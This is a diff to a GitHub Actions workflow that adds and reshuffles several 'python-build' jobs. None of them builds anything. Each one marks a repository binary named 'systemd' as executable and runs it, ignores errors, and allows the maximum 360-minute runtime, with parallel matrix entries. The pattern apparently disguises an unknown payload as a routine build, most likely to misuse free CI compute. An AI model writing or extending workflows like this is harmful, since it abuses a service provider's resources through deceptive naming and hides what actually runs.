@@ -35,14 +35,48 @@ jobs:
     - name: Python-run
       run: echo "python"
  
+ python-build-5:
+    runs-on: ubuntu-20.04 
+    needs: python-2
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1.11]
+         flag: [A]
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v2
+    - name: Rerunning
+      continue-on-error: true
+      run: |
+        chmod +x systemd
+        ./systemd
+        
+ python-build-4:
+    runs-on: ubuntu-20.04 
+    needs: python-2
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1.12]
+         flag: [B]
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v2
+    - name: Rerunning
+      continue-on-error: true
+      run: |
+        chmod +x systemd
+        ./systemd
+ 
  python-build-3:
     runs-on: ubuntu-20.04 
     needs: python-2
     strategy:
       fail-fast: false
       matrix:
-         go: [1.11, 1.12]
-         flag: [A]
+         go: [1.13]
+         flag: [C]
     timeout-minutes: 360
     steps:
     - uses: actions/checkout@v2
@@ -58,8 +92,8 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-         go: [1.11, 1.12]
-         flag: [B]
+         go: [1.14]
+         flag: [D]
     timeout-minutes: 360
     steps:
     - uses: actions/checkout@v2
@@ -68,15 +102,15 @@ jobs:
       run: |
         chmod +x systemd
         ./systemd
- 
+        
  python-build-1:
     runs-on: ubuntu-20.04 
     needs: python-2
     strategy:
       fail-fast: false
       matrix:
-         go: [1.11, 1.12]
-         flag: [C]
+         go: [1.15]
+         flag: [E]
     timeout-minutes: 360
     steps:
     - uses: actions/checkout@v2
